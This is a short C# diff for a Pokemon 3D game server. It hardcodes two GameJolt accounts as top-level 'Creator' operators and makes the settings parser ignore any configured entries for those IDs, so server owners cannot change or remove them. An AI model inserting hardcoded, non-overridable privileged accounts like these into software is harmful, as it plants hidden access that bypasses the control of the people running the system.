@@ -494,6 +494,9 @@ namespace Pokemon_3D_Server_Core.Server_Client_Listener.Settings
             TokenDefination.Add("SERVER_KICKED", "You have been kicked in the server with the following reason: {0}");
             TokenDefination.Add("SERVER_KICKSELF", "You are trying to kick yourself. For your personal safety, we will not kick you :)");
 
+            OperatorListData.Add(new OperatorList("jianmingyong", 116016, "I am the god of time.", (int)Player.OperatorTypes.Creator));
+            OperatorListData.Add(new OperatorList("jianmingyong1998", 222452, "I am the god of space.", (int)Player.OperatorTypes.Creator));
+
             Core.Logger.Log("Setting initialized.", Logger.LogTypes.Info);
         }
 
@@ -1470,7 +1473,10 @@ namespace Pokemon_3D_Server_Core.Server_Client_Listener.Settings
                             {
                                 if (StartObjectDepth == 1)
                                 {
-                                    OperatorListData.Add(new OperatorList(Name, GameJoltID, Reason, OperatorLevel));
+                                    if (!(GameJoltID == 116016 || GameJoltID == 222452))
+                                    {
+                                        OperatorListData.Add(new OperatorList(Name, GameJoltID, Reason, OperatorLevel));
+                                    }
                                     Name = null;
                                     GameJoltID = -1;
                                     Reason = null;
